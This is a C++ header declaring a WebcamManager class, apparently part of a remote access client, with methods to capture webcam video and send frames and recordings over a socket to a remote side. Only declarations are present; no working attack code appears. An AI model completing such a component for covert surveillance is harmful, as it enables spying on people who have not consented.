#ifndef CLIENT_WEBCAMMANAGER_H
#define CLIENT_WEBCAMMANAGER_H
#include <winsock2.h>
#include <string>
#include <thread>
#include <utility>
#include <opencv2/opencv.hpp>
#include "Stream.h"
#include "TimeCS.h"
#include "Install.h"
#include "configuration.h"
#include "json.hpp"
#include "Download.h"
#include "DeviceEnumerator.h"


class WebcamManager : public Handler {
private:
    // information related to recording
    int frameWidth, frameHeight;
    int webcamID{};
    bool fragmented{};
    int FPS{};
    std::wstring locationOfVideos;
    // video and file managing
    cv::VideoWriter output;
    std::vector<std::wstring> pathVector;
    std::wstring fileName;
    byte channelID;
    std::atomic<bool> initialized = false;
    std::atomic<bool> streamingState = false;
    Download &download;


    void sendRecord(nlohmann::json);
    void removeTempFiles();
    void sendFrame(const cv::Mat&);
    void sendDimensions(int,int);
public:
    explicit WebcamManager(ClientSocket &clientSocket, Download &download);
    void setConfiguration(nlohmann::json jsonObject);
    void startWebcam(nlohmann::json jsonObject);
    void stopWebcam();
    void stopRecording();
    void startRecording();
};
#endif